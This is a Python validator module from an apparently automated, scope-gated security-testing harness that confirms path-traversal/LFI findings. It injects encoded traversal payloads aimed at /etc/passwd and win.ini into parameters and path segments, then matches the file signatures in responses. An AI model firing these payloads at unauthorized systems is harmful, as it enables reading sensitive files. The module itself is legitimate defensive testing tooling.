"""
Path-traversal / local-file-inclusion confirmation leg (deterministic, in-band
canonical-file signal).

Detection of this class had a hole the others didn't: there was no `path_traversal`
category at all, so a finding labelled "directory traversal" / "LFI" canonicalised
to nothing and was silently NOT_TESTED (categories.py now defines it). This leg is
the confirmation half: inject a traversal sequence and check the RESPONSE for the
unmistakable contents of a well-known system file -- `/etc/passwd` (`root:...:0:0:`)
on POSIX, `win.ini` (`[extensions]` / `for 16-bit app support`) on Windows.
Matching the actual file contents, not just a 200, is what separates a confirmed
read from a reflected echo.

The injection point can be a query/body parameter OR a path SEGMENT: file servers
commonly expose the name in the URL path itself (`/uploads/<id>` ->
`/uploads/..%2f..%2f..%2fetc%2fpasswd`), so the leg tries the last file-ish path
segment as well as file/path-shaped parameters.

Fires on path_traversal findings, or -- shape-decoupled, like the ssrf/xxe legs --
on any request with a file/path-shaped parameter or a file-ish path segment.
Scope-gated; active (validators.active_enabled), and a non-GET replay additionally
needs validators.allow_mutating_replay (safety gate).
"""
from __future__ import annotations
from harness import scope_lock

import re
from urllib.parse import urlsplit, urlunsplit, parse_qsl

import httpx

from harness import global_throttle
from harness.categories import canonicalize
from harness.models import Finding, HttpExchange
from harness.safety_gate import GatedAsyncClient, get_default_gate, SafetyGateBlocked, ActionRiskTier
from .base import Validator, ValidationResult
from .injection_targets import param_targets, mutate, replay_headers, select_targets, coverage_note

_FILE_PARAM_NAMES = {"file", "filename", "path", "filepath", "page", "template", "doc",
                     "document", "download", "load", "read", "include", "view", "img",
                     "image", "attachment", "name", "dir", "folder", "resource", "item"}
_FILE_VALUE = re.compile(r"(^|/)[\w\-. ]+\.\w{1,5}$|[\\/]")

# Path segments that mark a file-serving route whose traversal lives in the path
# segment itself. Single source of truth -- orchestrator's shape routing imports
# this so the two never drift.
FILEISH_PATH_SEGMENTS = {"uploads", "upload", "files", "file", "download", "downloads",
                         "attachment", "attachments", "static", "docs", "documents",
                         "media", "assets", "images", "img", "export", "reports"}

# Traversal payloads: deep POSIX + Windows, filter-bypass encodings (`....//`
# collapses to `../` after a naive strip; URL-encoded dots and encoded slashes for
# path-segment injection where a raw `../` would be normalised by the client).
_PREFIXES = ("../../../../../../../../", "..\\..\\..\\..\\..\\..\\..\\..\\",
             "....//....//....//....//....//", "%2e%2e%2f" * 8, "..%2f" * 8,
             "%2e%2e/" * 8, "/", "")
_TARGETS = {
    "etc/passwd": re.compile(r"root:.*:0:0:", re.IGNORECASE),
    "windows/win.ini": re.compile(r"\[extensions\]|for 16-bit app support", re.IGNORECASE),
}
_MAX_PARAMS = 6
_PATHSEG = "pathseg"

# Review pt 7: the shape-decoupled fallback (probe any file/path-shaped request
# even when the LLM labelled it something else -- like the ssrf/xxe legs) is
# intentional coverage for unlabelled/mislabelled findings. But it should NOT
# fire for a finding whose class is DEFINITIONALLY a response-header/transport
# concern with no relationship to reading a file off disk: a CSP, CORS or TLS
# finding that merely happens to sit on a file-serving URL is not a
# path-traversal hypothesis, and sending traversal probes off the back of it is
# just unrequested active traffic. Narrow, explicit, and canonical so it never
# suppresses a genuinely file-read-adjacent class (misconfig, info_disclosure,
# recon, anomaly, etc. still get the shape-decoupled probe).
_NOT_FILE_READ_CLASSES = {"csp", "cors", "crypto", "sqli", "idor", "business_logic"}


def _file_shaped(exchange: HttpExchange) -> list[tuple[str, str]]:
    qs = dict(parse_qsl(urlsplit(exchange.url).query, keep_blank_values=True))
    out = []
    for loc, param in param_targets(exchange):
        val = qs.get(param, "") if loc == "query" else ""
        if param.lower() in _FILE_PARAM_NAMES or _FILE_VALUE.search(val or ""):
            out.append((loc, param))
    return out


def _last_segment_index(url: str) -> int | None:
    segs = urlsplit(url).path.split("/")
    for i in range(len(segs) - 1, -1, -1):
        if segs[i]:
            return i
    return None


def _fileish_segment(url: str) -> bool:
    segs = [s for s in urlsplit(url).path.split("/") if s]
    return any(s.lower() in FILEISH_PATH_SEGMENTS for s in segs)


def _mutate_last_segment(url: str, value: str) -> str | None:
    """Replace the last non-empty path segment with `value` verbatim (no
    re-encoding, so `%2e%2e%2f` survives into the path)."""
    parts = urlsplit(url)
    segs = parts.path.split("/")
    idx = None
    for i in range(len(segs) - 1, -1, -1):
        if segs[i]:
            idx = i
            break
    if idx is None:
        return None
    segs[idx] = value
    return urlunsplit((parts.scheme, parts.netloc, "/".join(segs), parts.query, parts.fragment))


class PathTraversalValidator(Validator):
    name = "path_traversal"
    finding_classes = {"path_traversal", "path traversal", "directory traversal",
                       "lfi", "local file inclusion", "file inclusion"}
    active = True

    def __init__(self, *, allowed_hosts: list[str] | None = None, timeout: float = 10.0,
                 run_context=None):
        self.allowed_hosts = allowed_hosts or []
        self.timeout = timeout
        self.run_context = run_context

    def applies(self, finding: Finding, exchange: HttpExchange) -> bool:
        # A finding explicitly labelled this class (or a traversal synonym)
        # routes whenever there is any injectable parameter -- unchanged.
        if super().applies(finding, exchange) and bool(param_targets(exchange)):
            return True
        # Shape-decoupled fallback, suppressed for header/transport-only classes
        # that are never a file read (review pt 7).
        if canonicalize(finding.vulnerability_class) in _NOT_FILE_READ_CLASSES:
            return False
        return bool(_file_shaped(exchange)) or _fileish_segment(exchange.url)

    def _skip(self, why: str) -> ValidationResult:
        return ValidationResult(self.name, "skipped", "path_traversal", summary=why)

    def _targets(self, exchange: HttpExchange, finding: Finding) -> tuple[list[tuple[str, str]], str]:
        params = param_targets(exchange)
        has_segment = _last_segment_index(exchange.url) is not None
        if has_segment and (finding.parameter_location or "").strip().lower() == "path":
            # The path segment is always tried, so a path-located finding is covered.
            finding = finding.model_copy(update={"parameter_name": ""})
        targets, coverage = select_targets(
            finding, _file_shaped(exchange) or params, _MAX_PARAMS, available=params)
        if has_segment:
            targets.append((_PATHSEG, ""))
        return targets, coverage

    def _mutated(self, exchange: HttpExchange, loc: str, param: str, value: str) -> tuple[str, str]:
        if loc == _PATHSEG:
            return (_mutate_last_segment(exchange.url, value) or exchange.url), (exchange.request_body or "")
        return mutate(exchange, loc, param, value)

    def _ceiling_spent(self, finding: Finding, method: str) -> bool:
        """Whether the run gate's per-finding mutating ceiling (R16) has no send
        left for this leg's finding. Once it is spent, every remaining mutating
        payload is refused too, so the refusal ends the leg rather than marking one
        payload unsendable. Read from the gate's own accounting, never from the
        refusal's wording. Only a mutating send keyed on a finding is counted; an
        accounting the gate cannot answer counts as spent (fail closed: the leg
        stops incomplete instead of reading the refusals as a negative)."""
        finding_id = getattr(finding, "finding_id", "") or ""
        if not finding_id:
            return False
        try:
            gate = self.run_context.gate
            if gate.classify(method) != ActionRiskTier.MUTATING:
                return False
            return gate.mutating_headroom(finding_id, self.name)[0] == 0
        except Exception:
            return True

    async def validate(self, finding: Finding, exchange: HttpExchange) -> ValidationResult:
        host = urlsplit(exchange.url).hostname or ""
        if self.allowed_hosts and not scope_lock.host_in_scope(exchange.url, self.allowed_hosts):
            return self._skip(f"host {host!r} out of scope")
        targets, coverage = self._targets(exchange, finding)
        if not targets:
            return self._skip("no file/path-shaped parameter or path segment to inject a traversal into")
        method = (exchange.method or "GET").upper()
        headers = replay_headers(exchange)
        session_ref = None
        request_headers = headers
        if self.run_context is not None:
            from .transport import bind_session
            session_ref, request_headers = bind_session(self.run_context, headers)
        # Probes that got no response (RV-P P7). A payload the scope lock or the
        # session's origin check cannot send (e.g. a backslash path segment) is
        # refused on its own and the rest still run; a refusal that ends the
        # run (budget, cancellation, mutating replay) stops the leg, and so does
        # the per-finding mutating ceiling (R16) once it is spent: the gate would
        # refuse every remaining payload alike. A probe that never answered is
        # not part of a negative.
        planned = len(targets) * len(_PREFIXES) * len(_TARGETS)
        answered = 0
        unsendable: list[str] = []
        errors: list[str] = []
        refused = ""
        # BM-2: the captured answer is the benign baseline for this endpoint. A
        # file signature it already carries (a default page quoting a passwd line,
        # a viewer that ignores the parameter) is not a read the payload caused, so
        # a probe confirms only with a signature match the baseline lacks.
        baseline = {t: set(m.findall(exchange.response_body or "")) for t, m in _TARGETS.items()}
        baseline_echoes = 0
        for loc, param in targets:
            if refused:
                break
            for prefix in _PREFIXES:
                if refused:
                    break
                for target, marker in _TARGETS.items():
                    url, body = self._mutated(exchange, loc, param, prefix + target)
                    label = f"{'path segment' if loc == _PATHSEG else param} <- {prefix + target}"
                    try:
                        if self.run_context is not None:
                            from harness.run_context import TypedRequest
                            outcome = await self.run_context.executor().execute(
                                TypedRequest(method, url, headers=request_headers,
                                             body=body or None),
                                capability=self.name, session_ref=session_ref,
                                case_ref=finding.finding_id or "", max_redirects=0)
                            if not outcome.executed:
                                ceiling_cut = (outcome.outcome == "blocked"
                                               and self._ceiling_spent(finding, method))
                                if outcome.outcome in ("out_of_scope", "blocked") and not ceiling_cut:
                                    unsendable.append(f"{label}: {outcome.outcome}")
                                    continue
                                why = getattr(outcome, "error", "") or ""
                                refused = (f"path-traversal replay declined: {outcome.outcome}"
                                           + (f" ({why})" if why else ""))
                                break
                            if not outcome.ok:
                                art = getattr(outcome, "artifact", None)
                                errors.append(f"{label}: "
                                              f"{getattr(art, 'transport_outcome', '') or outcome.error}")
                                continue
                            text = outcome.body or ""
                        else:
                            await global_throttle.acquire()
                            async with GatedAsyncClient(get_default_gate(), self.name,
                                                        timeout=self.timeout,
                                                        follow_redirects=False,
                                                        verify=False) as client:
                                resp = await client.request(
                                    method, url, headers=headers or None,
                                    content=body or None)
                            text = resp.text
                    except SafetyGateBlocked as blocked:
                        # One probe URL the gate refuses must not abort the whole leg
                        # and be mislabelled a mutating-replay denial. A traversal
                        # payload can produce a URL the scope lock cannot validate
                        # (e.g. backslash path segments), which fails closed as
                        # out-of-scope: skip that payload and try the rest. A genuine
                        # mutating-replay denial still terminates -- nothing more can send.
                        if blocked.decision.tier == ActionRiskTier.OUT_OF_SCOPE:
                            unsendable.append(f"{label}: out_of_scope")
                            continue
                        refused = (f"path-traversal replay not authorized by the safety gate "
                                   f"({blocked.decision.reason})")
                        break
                    except httpx.HTTPError as e:
                        errors.append(f"{label}: {e.__class__.__name__}")
                        continue
                    answered += 1
                    found = set(marker.findall(text))
                    if found and not found - baseline[target]:
                        baseline_echoes += 1
                    elif found:
                        where = "path segment" if loc == _PATHSEG else f"{loc} parameter {param!r}"
                        return ValidationResult(
                            self.name, "confirmed", "path_traversal", confidence=0.95, confirmed=True,
                            summary=f"Path traversal confirmed: the {where} read an arbitrary file "
                                    f"outside the intended directory.",
                            evidence=f"Injected `{prefix + target}` into the {where}; the response contained "
                                     f"the canonical contents of {target} (matched /{marker.pattern}/).")
        if not answered and not errors:
            # Nothing reached the target: a declined leg, as before.
            return self._skip(refused or f"path-traversal replay declined: every payload was "
                                         f"refused ({unsendable[0] if unsendable else 'none sent'})")
        if refused or errors:
            unanswered = planned - answered - len(unsendable)
            why = "; ".join(([refused] if refused else []) + errors[:3])
            return ValidationResult(
                self.name, "inconclusive", "path_traversal", confidence=0.0, confirmed=False,
                summary=f"Path-traversal check incomplete: {unanswered} of {planned} probe(s) got no "
                        f"response ({why}); not a negative result",
                evidence=f"{answered} answered probe(s) returned no system-file contents, but a "
                         f"probe that never answered cannot show them.")
        skipped = (f" {len(unsendable)} payload(s) could not be sent at all (e.g. {unsendable[0]})."
                   if unsendable else "")
        if baseline_echoes:
            skipped += (f" {baseline_echoes} response(s) carried only file signatures the captured "
                        f"baseline already shows, which is not a read the payload caused.")
        return ValidationResult(
            self.name, "not_confirmed", "path_traversal", confidence=0.0, confirmed=False,
            summary="No system-file contents returned -- traversal appears blocked or not a file read",
            evidence=f"Tried {len(targets)} injection point(s) across {len(_PREFIXES)} traversal encodings; "
                     f"neither /etc/passwd nor win.ini contents appeared.{skipped}" + coverage_note(coverage, finding),
            control_outcome=coverage)
